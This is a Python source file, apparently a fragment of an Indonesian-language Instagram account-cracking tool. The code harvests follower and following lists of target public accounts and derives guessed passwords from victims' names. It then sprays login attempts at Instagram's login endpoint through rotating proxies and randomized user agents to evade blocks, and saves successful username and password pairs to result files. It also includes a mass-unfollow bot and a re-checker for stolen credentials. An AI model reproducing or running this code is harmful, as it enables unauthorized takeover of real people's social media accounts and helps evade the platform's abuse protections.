                cok=input(f'{CY}[•] Masukan Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python run.py')
            elif loginpil == '2':
                masuk()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        masuk()
    x=instagram(pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        masuk()

class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            print("""\033[38;2;255;127;0;1m╭────────────────────────────\x1b[0m MENU TOOLS\033[38;2;255;127;0;1m ────────────────────────────╮
│ \x1b[0m[\033[1;32m01\x1b[0m] Dump Pengikut  [\033[1;32m02\x1b[0m] Result Insta   [\033[1;33m00\x1b[0m] Back To Menu Facebook\033[38;2;255;127;0;1m │
╰────────────────────────────────────────────────────────────────────╯""")

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}┣[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                loading()
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'\n{M}┣[!] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        print("""\x1b[0m
╭────────────────────────────────────────────────────────────────────╮
│ \x1b[0m [\x1b[1;92m01\x1b[0m] SANGAT LAMBAT  [\x1b[1;92m02\x1b[0m] CEPAT  [\x1b[1;92m03\x1b[0m] LAMBAT  [\x1b[1;92m04\x1b[0m] MEMBUAT SANDII  │
╰────────────────────────────────────────────────────────────────────╯""")
        c=input(f'{N}└──{H} ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M} Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'{CY}[•] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        io=f' \x1b[0m  WAKTU DAN PENEMPATAN STATUS CRACK ANDA ( {day} )   '
        oi = nel(io, style='cyan')
        cetak(nel(oi, title=' Date & Result '))
        with ThreadPoolExecutor(max_workers=15) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                except:
                    pass
        print('\n')
        oi='# CRACK SELESAI'
        io=mark(oi,style='yellow')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[FLAME]-{C}[{N}{loop}/{len(internal)}{C}]-[{H}{len(success)}{C}]-{C}[{K}{len(checkpoint)}{C}]{C}               "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 2.3.4; en-us;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='T-Mobile myTouch 3G Slide Build/GRI40)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/533.1'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title=' LIVE'))
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='yellow')
                    cetak(nel(oi, title=' SESI'))
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
                    self.crackAPI(user,pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': user_agent(),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='green')
                print('\n')
                cetak(nel(oi, title=' LIVE'))

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='yellow')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT'))

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'└──{H} ')
        if c=='':
            self.menu()
        elif c in ('3','03'):
            mas='# Masukan jumlah target'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            m=int(input(f'\n{CY}[•] Jumlah : {C}'));print('')
            mas='# Masukan nama ranfom untuk di searching'
            mas1=mark(mas,style='green')
            sol().print(mas1)
            for i in range(m):
                i+1
                nama=input(f'{CY}┣[>] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('1','01'):
                masal(self)

        elif c in ('5','05'):
            pr='# PASTIKAN TARGET BERSIFAT PUBLIK'
            po=mark(pr,style='red')
            sol().print(po)
            mas=input('Apakah anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n{CY}┣[+] Total Result MASTER_FU{H}{len(g)}{C}')
            print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}┣[#] proses check selesai...{C}')

        elif c in ('2','02'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}┣>>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}𝐌𝐀𝐌𝐏𝐔𝐒 𝐂𝐄𝐊𝐏𝐎𝐈𝐓{C}:
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} STATUS   :  LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('r','R'):
            self.BUG()
        elif c in ('c','C'):
            self.ChangeLog()
        elif c in ('0','00'):
            login()

        else:
            self.menu()

def mengi(self):
            try:
                menudump.append('pengikut')
                print("""{L}  ╭────────────────────────────────────────────────────────────────╮
  │      {U}{BA}Jumlah Username Yang Ingin Anda Crack Berapa Target{N}{L}       │
{N}╭─{L}╰────────────────────────────────────────────────────────────────╯""")
                m=int(input(f'{N}└──{H} '))
            except:m=1
            for t in range(m):
                t +=1
                nama=input(f'│  └──{H} ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    mas='# Target harus bersifat publik jangan privat'
    mas1=mark(mas,style='red')
    sol().print(mas1)
    m=input(f'{CY}[•] Username target : {C}')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                print("""\x1b[1;93m  ╭────────────────────────────────────────────────────────────────╮
  │      \033[1;35m\x1b[1;100mJumlah Username Yang Ingin Anda Crack Berapa Target\x1b[0m\x1b[1;93m       │
\x1b[0m╭─\x1b[1;93m╰────────────────────────────────────────────────────────────────╯""")
                m=int(input(f'{N}└──{H} '))
            except:m=1
            for t in range(m):
                t +=1
                nama=input(f'{N}│  └──{H} ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
            mas='# Target harus bersifat publik jangan privat'
            mas1=mark(mas,style='red')
            sol().print(mas1)
            m=input(f'{CY}[•] Username target : {C}')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)


#ex_run()
cek_cookie()
